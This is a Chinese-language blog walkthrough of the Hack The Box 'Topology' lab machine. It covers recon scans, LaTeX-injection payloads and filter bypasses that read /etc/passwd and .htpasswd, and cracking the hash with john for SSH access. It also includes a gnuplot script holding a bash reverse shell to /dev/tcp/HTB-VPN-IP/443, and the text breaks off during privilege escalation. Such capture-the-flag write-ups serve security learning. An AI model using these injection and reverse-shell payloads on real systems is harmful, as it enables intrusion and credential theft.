<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[HTB]  topology | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB]  topology</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-15T10:34:01.056Z" id="date"> 2023-07-15</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-15T10:40:53.113Z" id="updated"> 2023-07-15</time></div></span><br><span>Word Count: <div class="control">3.1k</div></span><br><span>Read Time: <div class="control">15 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/1.jpg'><img src="/pic/1.jpg" alt="1"></p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>HTB上的topology这台机子其实还挺难的，获取立足点那块真得要点经验。提权这块就相对简单了。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nmap -p- --min-rate=10000 10.10.11.217<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 03:45 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> topology.htb (10.10.11.217)<br>Host is up (0.096s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.81 seconds<br><br>$ sudo nmap -sT -sV -sC -O -p22,80 10.10.11.217<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 03:45 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> topology.htb (10.10.11.217)<br>Host is up (0.074s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)<br>|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)<br>|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Miskatonic University | Topology Group<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 16.26 seconds<br><br>$ sudo nmap --script=vuln 10.10.11.217<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 03:47 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos:<br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> topology.htb (10.10.11.217)<br>Host is up (0.079s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum:</span><br><span class="hljs-string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.41 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.41 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 662.23 seconds</span><br></code></pre></td></tr></table></figure>

<p>开了22和80端口，且80端口跑的是apache部署的网站服务器。简单漏扫也没发现什么可用的结果，接着往下吧。</p>
<h3 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nikto -h 10.10.11.217<br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.11.217<br>+ Target Hostname:    10.10.11.217<br>+ Target Port:        80<br>+ Start Time:         2023-07-15 04:12:04 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.41 (Ubuntu)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ /: Server may leak inodes via ETags, header found with file /, inode: 1a6f, size: 5f27900124a8b, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418<br>+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .<br>+ /css/: Directory indexing found.<br>+ /css/: This might be interesting.<br>+ /images/: Directory indexing found.<br>+ 8074 requests: 0 error(s) and 8 item(s) reported on remote host<br>+ End Time:           2023-07-15 04:23:51 (GMT-4) (707 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>

<p>nikto也没什么建树。</p>
<h3 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo whatweb http://10.10.11.217<br>http://10.10.11.217 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[lklein@topology.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.217], Title[Miskatonic University | Topology Group]<br></code></pre></td></tr></table></figure>

<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>先看看网页。</p>
<p class='item-img' data-src='/pic/assets/e416aafb1399d17450c0c6d198c0b8e0.png'><img src="/pic/assets/e416aafb1399d17450c0c6d198c0b8e0.png" alt="e416aafb1399d17450c0c6d198c0b8e0"></p>
<p>主页是介绍一个大学的拓扑学研究小组，也不是拿什么常见的CMS搭的。但是在Software projects板块有个链接引起了我们的注意，我们点进去发现并不能正常跳转，我们看浏览器地址栏发现是个子域名，那我们将其加入hosts中，就能成功访问了。</p>
<p class='item-img' data-src='/pic/assets/4dd7b3ab3c9e2e857513d6fcb19844bd.png'><img src="/pic/assets/4dd7b3ab3c9e2e857513d6fcb19844bd.png" alt="4dd7b3ab3c9e2e857513d6fcb19844bd"></p>
<p>这个网页的功能是将输入的LaTex公式转换成图片。但是先不管这个，俗话说，家里有一只蟑螂就等于有一千只蟑螂，有一个子域名会不会还有别的子域名，生性多疑的我们肯定要探查一二。直接上wufuzz扫一下vhost再说。</p>
<h3 id="子域名探查"><a href="#子域名探查" class="headerlink" title="子域名探查"></a>子域名探查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wfuzz -H <span class="hljs-string">&quot;Host: FUZZ.topology.htb&quot;</span> --hc 404,403 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://topology.htb<br></code></pre></td></tr></table></figure>

<p>出来了好多报200的，很明显这么多不可能都是子域名，那我们屏蔽一下545w个字符数的结果再看看（因为这个返回的最多，多半是不是子域名的结果。）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wfuzz -H <span class="hljs-string">&quot;Host: FUZZ.topology.htb&quot;</span> --hc 404,403 --hw 545  -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://topology.htb<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not wor                       k correctly when fuzzing SSL sites. Check Wfuzz<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://topology.htb/</span><br><span class="hljs-string">Total requests: 4989</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload</span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000019:   401        14 L     54 W       463 Ch      &quot;dev&quot;</span><br><span class="hljs-string">000000061:   200        5 L      9 W        108 Ch      &quot;stats&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 0</span><br><span class="hljs-string">Processed Requests: 750</span><br><span class="hljs-string">Filtered Requests: 748</span><br><span class="hljs-string">Requests/sec.: 0</span><br></code></pre></td></tr></table></figure>

<p>这回OK了，返回了我们想要的结果，一个<code>dev</code>和一个<code>stats</code>，网站还有这两个子域名。那我们把他们都加进hosts后一个一个看。</p>
<p>先看返回200的。</p class='item-img' data-src='/pic/assets/ef43f1ce9eba15bf567780edf183863f.png'><img src="/pic/assets/ef43f1ce9eba15bf567780edf183863f.png" alt="ef43f1ce9eba15bf567780edf183863f" style="zoom:50%;" />

<p>和名字一样，是返回网站状况的。但是有张图不知道为啥没加载出来，但是管他呢，这个页面没什么可以下手的点。</p>
<p>再看看dev。</p>
<p class='item-img' data-src='/pic/assets/13263cfd5d7b5812cfcec26ffbe3026c.png'><img src="/pic/assets/13263cfd5d7b5812cfcec26ffbe3026c.png" alt="13263cfd5d7b5812cfcec26ffbe3026c"></p>
<p>上来就找我们要密码，难怪扫描返回401未授权。那看来我们是要想办法搞到这个密码了。先扫扫这个目录看看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">┌──(meamea㉿racknerd-4565a8)-[~]<br>└─$ sudo dirsearch -u http://dev.topology.htb/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/dev.topology.htb/-_23-07-14_04-05-47.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-14_04-05-47.log<br><br>Target: http://dev.topology.htb/<br><br>[04:05:47] Starting:<br>[04:05:56] 403 -  281B  - /.ht_wsr.txt<br>[04:05:56] 403 -  281B  - /.htaccess.bak1<br>[04:05:56] 403 -  281B  - /.htaccess_extra<br>[04:05:56] 403 -  281B  - /.htaccess.save<br>[04:05:56] 403 -  281B  - /.htaccess.sample<br>[04:05:56] 403 -  281B  - /.htaccess.orig<br>[04:05:56] 403 -  281B  - /.htaccess_sc<br>[04:05:56] 403 -  281B  - /.htaccess_orig<br>[04:05:56] 403 -  281B  - /.htaccessBAK<br>[04:05:56] 403 -  281B  - /.htaccessOLD<br>[04:05:56] 403 -  281B  - /.htaccessOLD2<br>[04:05:56] 403 -  281B  - /.htm<br>[04:05:56] 403 -  281B  - /.html<br>[04:05:56] 403 -  281B  - /.htpasswd_test<br>[04:05:56] 403 -  281B  - /.htpasswds<br>[04:05:56] 403 -  281B  - /.httr-oauth<br>[04:06:02] 403 -  281B  - /.php<br></code></pre></td></tr></table></figure>

<p>看到好像有<code>/.htpasswds</code>和<code>/.htpasswds_test</code>，一般这种http类型的网页验证很多时候凭证都是存在这些文件或者<code>/.htpasswd</code>文件里面。那么问题来了，目标有了，我们怎么去查看这些文件呢？</p>
<h3 id="LaTex-Injection"><a href="#LaTex-Injection" class="headerlink" title="LaTex Injection"></a>LaTex Injection</h3><p>回想到之前不还有个Latex页面没看嘛。这玩意不知道有什么用就直接问问神奇的谷歌：<code>Latex exploit</code>，就搜到了好多latex injection的利用方式。第一个搜索结果的<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection">hacktricks</a>上就写的很详细，我们按他上面的方法试一试。</p>
<p>可惜事情并没有这么简单，一大串利用方式下来，就没几个能成功的，很多都显示非法命令被检测了。</p>
<p class='item-img' data-src='/pic/assets/6dd0139f6a0f1134394c3b7f75e77f0b.png'><img src="/pic/assets/6dd0139f6a0f1134394c3b7f75e77f0b.png" alt="6dd0139f6a0f1134394c3b7f75e77f0b"></p>
<p>很显然网站是对Latex命令做了过滤的，并且过滤的还挺多。但是其中，读取文件中一行的内容还是可以的。</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\newread</span><span class="hljs-keyword">\file</span><br><span class="hljs-keyword">\openin</span><span class="hljs-keyword">\file</span>=/etc/passwd<br><span class="hljs-keyword">\read</span><span class="hljs-keyword">\file</span> to<span class="hljs-keyword">\line</span><br><span class="hljs-keyword">\text</span>&#123;<span class="hljs-keyword">\line</span>&#125;<br><span class="hljs-keyword">\closein</span><span class="hljs-keyword">\file</span><br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/pic/assets/2c0997500981d838fefe474b052e1acd.png'><img src="/pic/assets/2c0997500981d838fefe474b052e1acd.png" alt="2c0997500981d838fefe474b052e1acd"></p>
<p>如果想多看几行也是可以的。把读行命令重复几遍就行，但是太多的话也不行，网站还对输入长度做了限制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">\newread\file<br>\openin\file=/etc/passwd<br>\read\file to\line<br>\text&#123;\line&#125;<br>\read\file to\line<br>\text&#123;\line&#125;<br>\read\file to\line<br>\text&#123;\line&#125;<br>\read\file to\line<br>\text&#123;\line&#125;<br>\closein\file<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/pic/assets/da5963a31d9e90fa71c32c74c645a185.png'><img src="/pic/assets/da5963a31d9e90fa71c32c74c645a185.png" alt="da5963a31d9e90fa71c32c74c645a185"></p>
<p>再长就不行了。那我们试试读<code>/.htpasswds</code>、<code>/.htpasswds_test</code>以及<code>/.htpasswd</code>。发现全部都会报错，不知道为啥…..可能是这样读取文件有问题。</p>
<p>于是在网上各种找绕过过滤的方式，甚至看了一篇论文<a target="_blank" rel="noopener" href="https://checkoway.net/papers/tex2010/tex2010.pdf">《Are Text-Only Data Formats Safe? Or, Use This LATEX Class File to Pwn Your Computer》</a></p>
<p>里面提到的几种绕过方式：</p>
<ol>
<li><p><code>\catcode</code>: 更改字符的类别代码，将X改成转义字符（即’\‘），然后把X当\用。</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\catcode</span>`<span class="hljs-keyword">\X</span>=0<br>Xinput&#123;/etc/passwd&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><code>^^5c</code>：latex遇到两个^^后会把后面的16进制数作为ASCII值识别，所以^^5c&#x3D;\。</p>
</li>
<li><p><code>\csname input\endcsname</code>：绕过\input</p>
</li>
<li><p><code>\begin&#123;input&#125;&#123;/etc/passwd&#125;\end&#123;input&#125;</code>：绕过\input</p>
</li>
</ol>
<p>虽然学习到了很多新姿势，但这些方式都没能成功绕过，都会报错。</p>
<p>最后查了一下发现了解决方案：数学模式下行内模式（两端加上$$）调用<code>\lstinputlisting</code>:</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-built_in">$</span><span class="hljs-keyword">\lstinputlisting</span>&#123;/etc/passwd&#125;<span class="hljs-built_in">$</span><br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/pic/assets/cba2fa3f12f70749871a96b8e518a3c8.png'><img src="/pic/assets/cba2fa3f12f70749871a96b8e518a3c8.png" alt="cba2fa3f12f70749871a96b8e518a3c8"></p>
<p>可以查看文件全部内容了。那我们再试试<code>/.htpasswds</code>、<code>/.htpasswds_test</code>以及<code>/.htpasswd</code>这几个。发现只有<code>/.htpasswd</code>能读成功。</p>
<p class='item-img' data-src='/pic/assets/681.png'><img src="/pic/assets/681.png" alt="681"></p>
<h3 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h3><p>我们直接把其丢进john里面破解一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$sudo</span> john rawpass --wordlist=/usr/share/wordlists/rockyou.txt<br>Created directory: /root/.john<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;md5crypt&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;md5crypt-long&quot;</span><br>Use the <span class="hljs-string">&quot;--format=md5crypt-long&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])<br>Will run 2 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>**********       (vdaisley)<br>1g 0:00:00:13 DONE (2023-07-15 05:24) 0.07320g/s 72885p/s 72885c/s 72885C/s calebd1..calacho<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure>

<p>成功得到密码。</p>
<p>我们登陆一下dev看看。</p>
<p class='item-img' data-src='/pic/assets/324f7908a46b1e94385fc588a05e6244.png'><img src="/pic/assets/324f7908a46b1e94385fc588a05e6244.png" alt="324f7908a46b1e94385fc588a05e6244"></p>
<p>然而这网站啥也没有。那我们试试存不存在凭证复用的情况，我们试试拿凭证去登一下ssh，发现能成功登录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh vdaisley@10.10.11.217<br>vdaisley@10.10.11.217<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Expanded Security Maintenance for Applications is not enabled.</span><br><span class="hljs-string"></span><br><span class="hljs-string">0 updates can be applied immediately.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Enable ESM Apps to receive additional future security updates.</span><br><span class="hljs-string">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Sat Jul 15 05:05:23 2023 from 10.10.14.187</span><br><span class="hljs-string">vdaisley@topology:~$ </span><br></code></pre></td></tr></table></figure>

<p>在home目录下拿到user flag。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="老三样"><a href="#老三样" class="headerlink" title="老三样"></a>老三样</h3><p><code>sudo -l</code>、find suid bins以及cat crontab一无所获。手动遍历了一下文件也没发现啥特别的。</p>
<h3 id="linpeas"><a href="#linpeas" class="headerlink" title="linpeas"></a>linpeas</h3><p>传统的不行来点电子的。上linpeas。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">╔══════════╣ Unexpected <span class="hljs-keyword">in</span> /opt (usually empty)<br>total 12<br>drwxr-xr-x  3 root root 4096 May 19 13:04 .<br>drwxr-xr-x 18 root root 4096 Jun 12 10:37 ..<br>drwx-wx-wx  2 root root 4096 Jun 14 07:45 gnuplot<br></code></pre></td></tr></table></figure>

<p>我们发现&#x2F;opt下有个文件夹，更奇怪的是这个文件夹只有写和执行权限，不能读。非常奇怪的文件权限设置，事出反常必有妖。我们搜一下gnuplot是干啥的，发现是一个画图的工具，加个exp一查发现了非常多的提权利用方式。我们尝试一下payload。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#test.plt</span><br>system <span class="hljs-string">&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/HTB-VPN-IP/443 0&gt;&amp;1&#x27;&quot;</span><br><br>gnuplot test.plt<br></code></pre></td></tr></table></figure>

<p>本地开一个监听成功收到了反弹shell。然而问题是，只是用户的反弹shell，如何让root执行我们的plt文件呢？而且到底这个gnuplot文件夹是干啥的？</p>
<h3 id="gunplot-exploit"><a href="#gunplot-exploit" class="headerlink" title="gunplot exploit"></a>gunplot exploit</h3><p>我们用<code>pspy64</code>看看有什么进程在执行，多么希望gnuplot在运行（其实肯定在运行，因为之前stats那个图其实就是用gnuplot画的，细想一下的话就有理由怀疑这个文件夹里装的就是gnuplot运行的plt文件）。</p>
